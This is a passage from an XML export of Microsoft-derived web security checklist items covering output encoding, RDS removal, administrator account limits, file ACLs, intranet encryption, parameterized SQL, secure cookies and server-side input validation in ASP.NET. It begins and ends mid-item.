&lt;p&gt;Encode untrusted data ensures that it is treated as literal text and not as script.&amp;nbsp; You can use the
&lt;strong&gt;Microsoft.Security.ApplicationAntiXSSLibrary.HtmlEncode&lt;/strong&gt; method to encode untrusted data.&amp;nbsp;&amp;nbsp;If you write URLs that might contain unsafe characters because they have been constructed from input data or data from a shared database, use
&lt;strong&gt;Microsoft.Security.ApplicationAntiXSSLibrary.UrlEncode&lt;/strong&gt; to make them safe.
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; &amp;nbsp; &amp;nbsp; Make sure that you encode data at the last possible opportunity before the data is returned to the client.&amp;nbsp; If you encode any earlier than this, you may not know the exact context that the data will be used in, and hence the format
 you need to encode into.&amp;nbsp; Also, early encoding of some data can result in double encoding problems.
&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/PAGHT000003.asp"&gt;How To: Protect From Injection Attacks in ASP.NET&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/PAGHT000001.asp"&gt;How To: Use Regular Expressions to Constrain Input in ASP.NET&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/PAGHT000004.asp"&gt;How To: Prevent Cross-Site Scripting in ASP.NET&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:8a220644-4285-423d-9ebc-7f9069a038a5"&gt;Guideline: Validate Input from All Sources For Type, Length, Format, and Range&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:4dfedb8e-17d3-495d-843e-476c5e470f27"&gt;Guideline: Encode all Output Which Contains Untrusted Data by Context&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:417133af-0ab8-4ad5-9aea-a59b08abf022"&gt;Checklist Item: All the Input is Validated For Length, Range, Format, and Type&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9ced6a73-1c18-4f7b-83a0-7094731042f5</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>MSADC virtual directory (RDS) is removed or secured.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the MSADC virtual directory (RDS) is removed or secured.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Remote Data Services (RDS) is a component that enables controlled Internet access to&amp;nbsp;remote data resources through IIS. The RDS interface is provided by Msadcs.dll, which is located in the following directory: program files\common files\system\Msadc.&lt;/p&gt;
&lt;h3&gt;Removing RDS&lt;/h3&gt;
&lt;p&gt;If your applications do not use RDS, remove it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To remove RDS support&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Remove the /MSADC virtual directory mapping from IIS. &lt;/li&gt;&lt;li&gt;Remove the RDS files and subdirectories at the following location:
&lt;p&gt;\Program Files\Common Files\System\Msadc &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;Remove the following registry key:
&lt;p&gt;HKLM\System\CurrentControlSet\Services\W3SVC\Parameters\ADCLaunch &lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;IISLockdown provides an option to remove the MSADC virtual directory. Note that IISLockdown only removes the virtual directory, not the files or registry key.&lt;/blockquote&gt;
&lt;h3&gt;Securing RDS&lt;/h3&gt;
&lt;p&gt;If your applications require RDS, secure it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To secure RDS&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Delete the samples at the following location:
&lt;p&gt;\Progam Files\Common Files\System\Msadc\Samples &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;Remove the following registry key:
&lt;p&gt;&lt;strong&gt;HKLM\System\CurrentControlSet\Services\W3SVC\Parameters\ADCLaunch\VbBusObj.VbBusObjCls&lt;/strong&gt;
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;Disable Anonymous access for the MSADC virtual directory in IIS. &lt;/li&gt;&lt;li&gt;Create a &lt;strong&gt;HandlerRequired&lt;/strong&gt; registry key in the following location:
&lt;p&gt;&lt;strong&gt;HKLM\Software\Microsoft\DataFactory\HandlerInfo\&lt;/strong&gt; &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;Create a new DWORD value, and set it to &lt;strong&gt;1&lt;/strong&gt; (1 indicates safe mode, while 0 indicates unsafe mode.
&lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;You can use the registry script file Handsafe.reg to change the registry key. The script file is located in the msadc directory: \Program Files\Common Files\System\msadc&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;p&gt;For more information about securing RDS, see the following: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MS99-025 Microsoft Security Program: Unauthorized Access to IIS Servers through ODBC Data Access with RDS at
&lt;a href="http://www.microsoft.com/technet/security/bulletin/ms99-025.mspx"&gt;http://www.microsoft.com/technet/security/bulletin/ms99-025.mspx&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;MS98-004 Microsoft Security Program: Microsoft Security Bulletin: Unauthorized ODBC Data Access with RDS and IIS at
&lt;a href="http://www.microsoft.com/technet/security/bulletin/ms98-004.mspx"&gt;http://www.microsoft.com/technet/security/bulletin/ms98-004.mspx&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;Microsoft Knowledge Base article 184375, &amp;quot;PRB: Security Implications of RDS 1.5, IIS 3.0 or 4.0, and ODBC.&amp;quot;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9e04207f-a232-4225-8e35-5e4f51d01026</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>No more than two accounts exist in the Administrators group.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that&amp;nbsp;the Local Administrators Group Membership&amp;nbsp;is restricted by limiting the administration accounts to two.&amp;nbsp;Also, passwords must not be shared, to provide accountability.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;This helps provide accountability.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>a314bf76-87d5-4247-aefe-0adcc397b645</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Appropriate ACLs are Configured on Web Site Files</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that your application configures right access control lists (ACLs) for the right identities on its Web site files.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;You need to configure the right access control lists (ACLs) for the right identities on your Web site files so that IIS and also ASP.NET file authorization control access to these files appropriately. You need to grant access to the following identities:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Your Web application identity.&lt;/strong&gt; If you are using a custom service account to run your ASP.NET application, you can grant the appropriate permissions to the IIS metabase and to the file system by running Aspnet_regiis.exe with the -&lt;strong&gt;ga&lt;/strong&gt;
 switch. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Your application's users.&lt;/strong&gt; ASP.NET file authorization performs access checks for file types mapped by IIS to the ASP.NET ISAPI extension (Aspnet_isapi.dll). If you are using Windows authentication, the authenticated user's Windows access
 token (which may be IUSR_MACHINE for anonymous users) is checked against the ACL attached to the requested ASP.NET file. If you are using forms authentication, access is checked against IUSR_MACHINE.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;File authorization works automatically when using Windows authentication, and there is no need to impersonate the original user. The
&lt;strong&gt;FileAuthorizationModule&lt;/strong&gt; only performs access checks against the requested file. For example, if you request Default.aspx and it contains an embedded user control (Usercontrol.ascx), which in turn includes an image tag (pointing to Image.gif),
 the &lt;strong&gt;FileAuthorizationModule&lt;/strong&gt; performs an access check for Default.aspx and Usercontrol.ascx, because these file types are mapped by IIS to the ASP.NET ISAPI extension. The
&lt;strong&gt;FileAuthorizationModule&lt;/strong&gt; does not perform a check for Image.gif, because this is a static file handled internally by IIS. However, because access checks for static files are performed by IIS, the authenticated user must still be granted read
 permission to the file with an appropriately configured ACL.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>a7901344-ba40-4047-8368-a9ecfea7c973</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Intranet traffic is encrypted (for example, with SSL) or restricted if you do not have a secure data center infrastructure.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that intranet traffic is encrypted (for example, with SSL) or restricted if you do not have a secure data center infrastructure.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;For inside (intranet-facing) NICs, if you do not have a secure data center and you have sensitive information passing between computers, you need to consider whether to encrypt the traffic and whether to restrict communications between the Web server and
 downstream servers (such as an application server or database server). Encrypting network traffic addresses the threat posed by network eavesdropping. If the risk is deemed sufficiently small you may choose not to encrypt&amp;nbsp;the traffic.&lt;/p&gt;
&lt;p&gt;The type of encryption used also affects the types of threats that it addresses. For&amp;nbsp;example, SSL is application-level encryption, whereas IPSec is transport layer encryption. As a result, SSL counters the threat of data tampering or information disclosure
 from another process on the same machine, particularly one running under a different account in addition to the network eavesdropping threat.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>a8a568b3-6d2c-4a5f-b710-03d7a9d0beb4</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>SQL Queries use Parameterized Stored Procedures and Type-safe SQL Parameters</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application uses parameterized stored procedures and type-safe SQL parameters when constructing SQL queries.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Use type safe parameters when constructing SQL queries to avoid possible SQL injection attacks that can occur with unfiltered input. You can use type safe parameters with stored procedures and with dynamic SQL statements. Parameters are treated as literal
 values by the database and not as executable code. Parameters are also checked for type and length.&lt;/p&gt;
&lt;p&gt;The following code shows how to use type safe parameters with the &lt;strong&gt;SqlParameterCollection&lt;/strong&gt; when calling a stored procedure.&lt;/p&gt;
&lt;pre&gt;using System.Data;&lt;br&gt;using System.Data.SqlClient;&lt;br&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt; DataSet userDataset = new DataSet();&lt;br&gt; SqlDataAdapter myCommand = new SqlDataAdapter(LoginStoredProcedure&amp;quot;, connection);&lt;br&gt; myCommand.SelectCommand.CommandType = CommandType.StoredProcedure;&lt;br&gt; myCommand.SelectCommand.Parameters.Add(&amp;quot;@au_id&amp;quot;, SqlDbType.VarChar, 11);&lt;br&gt; myCommand.SelectCommand.Parameters[&amp;quot;@au_id&amp;quot;].Value = SSN.Text;&lt;br&gt; myCommand.Fill(userDataset);&lt;br&gt;}  &lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;In the preceding code example, the input value cannot be longer than 11 characters. If the data does not conform to the type or length defined by the parameter, the
&lt;strong&gt;SqlParameter&lt;/strong&gt; class throws an exception.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;p&gt;For more information about preventing SQL injection, see &lt;a href="http://msdn2.microsoft.com/en-us/library/ms998271.aspx"&gt;
HOW TO: Protect from SQL Injection in ASP.NET&lt;/a&gt;&amp;nbsp;on MSDN.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>abaaab64-540f-4535-b249-3c9295b7b1d0</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Authentication Cookies are Restricted to Only HTTPS Connections by using the requireSSL Attribute</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application restricts authentication cookies&amp;nbsp;to only&amp;nbsp;HTTPS connections by using the requireSSL attribute.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;By using SSL, you prevent an attacker from reading a captured authentication cookie&amp;nbsp;and gaining spoofed access to your application.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Set the &lt;strong&gt;secure&lt;/strong&gt; property of the authentication cookie to ensure that browsers only send authentication cookies over HTTPS connections.
&lt;/p&gt;
&lt;p&gt;Set the &lt;strong&gt;secure&lt;/strong&gt; property by using &lt;strong&gt;requireSSL=&amp;quot;true&amp;quot;&lt;/strong&gt; on the &amp;lt;&lt;strong&gt;forms&lt;/strong&gt;&amp;gt; element as shown here:&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;forms loginUrl=&amp;quot;Secure\Login.aspx&amp;quot;&lt;br&gt;        requireSSL=&amp;quot;true&amp;quot; ... /&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ad75cecc-a8d1-46c9-a6ac-9bad61328e80</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Application Does Not Rely Only on Client-Side Validation</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application is not relying on client-side validation in order to make security decisions.&amp;nbsp;Client-side validation is ok to give the user feedback on bad input for a better user experience, but it can be easily bypassed, so you need to&amp;nbsp;verify
 that&amp;nbsp;all validation that occurs on the client also occurs on the server. &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Client-side validation can be easily bypassed. For example, a malicious user could disable&amp;nbsp;the client-side script routines by disabling JavaScript. Users&amp;nbsp;may also construct their own&amp;nbsp;form posts using custom HTML, or&amp;nbsp;using an&amp;nbsp;HTTP proxy to modify form posts.
 Reliance on client-side validation can lead to code injection vulnerabilities (such as cross site scripting or SQL injection).&amp;nbsp;If you use client-side validation to enforce application logic, such as the cost of items in an online store, the logic can be circumvented
 resulting in vulnerabilities ranging from application defacement to theft of merchandise or money.
&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To check for this problem, use the following steps:&amp;nbsp;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find all validation routines in your application.&lt;/strong&gt; Review your application design and code for the presence of validation routines. Make a list of these for use in later steps. Every source of user input should be validated with a validation
 routine shortly after the input enters the application&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Review the validation routines to ensure they run on the server. &lt;/strong&gt;
Review each validation routine and if it is client-side, ensure that it either has a corollary on the server or is designed to run on both client and server. For instance the ASP.NET validator controls, such as the
&lt;strong&gt;RegularExpressionValidator&lt;/strong&gt;, &lt;strong&gt;RangeValidator&lt;/strong&gt;, and
&lt;strong&gt;CustomValidator&lt;/strong&gt;, will automatically validate input on both the client and the server&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Validating input is&amp;nbsp;inherently difficult because the range of&amp;nbsp;possible&amp;nbsp;values is hard to constrain. It is&amp;nbsp;important to specify what input is acceptable rather than trying to specify all&amp;nbsp;the&amp;nbsp;variations&amp;nbsp;of input that are&amp;nbsp;illegal (allow listing as opposed to
 blacklisting).&lt;/p&gt;
&lt;p&gt;Use ASP.NET validator controls to check user input on the server side and provide feedback to the user when input fails to pass validation requirements. Follow these steps on each form page in an application:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine the required fields. &lt;/strong&gt;Use the required field validator control to ensure all required fields are present. Here is an example that declares a text field in an ASP page that is a required field:&lt;/p&gt;
&lt;pre&gt;&amp;lt;td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;asp:RequiredFieldValidator runat=server &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=txtName&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ErrorMessage=&amp;quot;User ID is required.&amp;quot;&amp;gt; *&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;/asp:RequiredFieldValidator&amp;gt;&lt;br&gt;&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;User ID:&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;&amp;lt;input type=text runat=server id=txtName&amp;gt;&amp;lt;/td&amp;gt;&lt;/pre&gt;
&lt;p&gt;The * is displayed next to the label if the input is blank. The error message is reported in a summary. The
&lt;strong&gt;ControlToValidate&lt;/strong&gt; property specifies the ID of the control to validate. The final step is to add a validation summary to the top of the page like so:&lt;/p&gt;
&lt;pre&gt;&amp;lt;asp:ValidationSummary runat=server &lt;br&gt;HeaderText=&amp;quot;There were errors on the page:&amp;quot; /&amp;gt;&lt;br&gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enforce numeric range&amp;nbsp;constraints.&amp;nbsp; &lt;/strong&gt;Use the RangeValidator control to ensure any numeric values are constrained to a specific, acceptable&amp;nbsp;range. Here is an example that declares an integer field&amp;nbsp;in an ASP page that has&amp;nbsp;a valid range from
 1 to 50: &lt;/p&gt;
&lt;pre&gt;&amp;lt;td&amp;gt;&lt;br&gt;  &amp;lt;asp:RangeValidator id=&amp;quot;Range1&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=&amp;quot;txtState&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MinimumValue=&amp;quot;1&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MaximumValue=&amp;quot;50&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Type=&amp;quot;Integer&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; EnableClientScript=&amp;quot;false&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;The value must be from 1 to 50!&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; runat=&amp;quot;server&amp;quot;&amp;gt; * &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; &amp;lt;/asp:RangeValidator&amp;gt;&lt;br&gt;&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;State:&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;&amp;lt;input type=text runat=server id=txtState&amp;gt;&amp;lt;/td&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Validate&amp;nbsp;verification fields.&amp;nbsp;&lt;/strong&gt;Fields such as password entry are often verified by having the user re-type them to ensure they are correct. Use the
&lt;strong&gt;CompareValidator&lt;/strong&gt; control to make the comparisons and ensure validity/integrity. Here is an example that declares&amp;nbsp;two password&amp;nbsp;fields&amp;nbsp;in an ASP page that&amp;nbsp;must match in order to validate properly:&lt;/p&gt;
&lt;pre&gt;&amp;lt;asp:CompareValidator runat=server&lt;br&gt;            ControlToValidate=txtRePWord&lt;br&gt;            ControlToCompare=txtPWord&lt;br&gt;             ErrorMessage=&amp;quot;Passwords do not match.&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;p&gt;In this case, the two fields being compared are &amp;quot;txtPWord&amp;quot; and &amp;quot;txtRePWord&amp;quot;. If they do not&amp;nbsp;match, validation fails with the error message, &amp;quot;Passwords do not match.&amp;quot;&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enforce type constraints on string fields. &lt;/strong&gt;String fields are the most difficult type of input to effectively validate because the range of acceptable&amp;nbsp;characters is much larger then numeric&amp;nbsp;and enumerated types. Regular expressions provide
 a flexible mechanism for dictating valid patterns and characters. Use the &lt;strong&gt;
RegularExpressionValidator&lt;/strong&gt; to perform a variety of checks on string-based fields such as zip codes and phone numbers.&lt;/p&gt;
&lt;p&gt;Here is an example that declares a&amp;nbsp;text field&amp;nbsp;in an ASP page that should represent a five digit zip code consisting entirely of numeric digits, and a validator to enforce those constraints:&lt;/p&gt;
&lt;pre&gt;&amp;lt;input type=text runat=server id=txtZip&amp;gt;&lt;br&gt;      &amp;lt;asp:RegularExpressionValidator runat=server&lt;br&gt;             ControlToValidate=&amp;quot;txtZip&amp;quot;&lt;br&gt;             ErrorMessage=&amp;quot;Zip code must be 5 digits, all numbers.&amp;quot;&lt;br&gt;             ValidationExpression=&amp;quot;[0-9]{5}&amp;quot;&amp;gt; *&lt;br&gt;      &amp;lt;/asp:RegularExpressionValidator&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;Zip code:&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;&amp;lt;input type=text runat=server id=txtZip&amp;gt;&amp;lt;/td&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use custom validation to handle remaining&amp;nbsp;input constraints. &lt;/strong&gt;
The built-in ASP.NET&amp;nbsp;validation controls handle&amp;nbsp;most of the cases that commonly arise in&amp;nbsp;web applications, but there&amp;nbsp;may be&amp;nbsp;times when they are not appropriate.&amp;nbsp;The
&lt;strong&gt;CustomValidator&lt;/strong&gt; enables custom validation code that can plug into the existing validation system. Here is an example that declares a&amp;nbsp;text field&amp;nbsp;in an ASP page. For this particular text field, there is business logic that needs to be satisfied
 which is not easily constrainable by the&amp;nbsp;other&amp;nbsp;validation constructs, so a&amp;nbsp;custom validator is implemented that ensures the&amp;nbsp;string&amp;nbsp;in the text field&amp;nbsp;does not start&amp;nbsp;with the letter &amp;quot;a&amp;quot;:&lt;/p&gt;
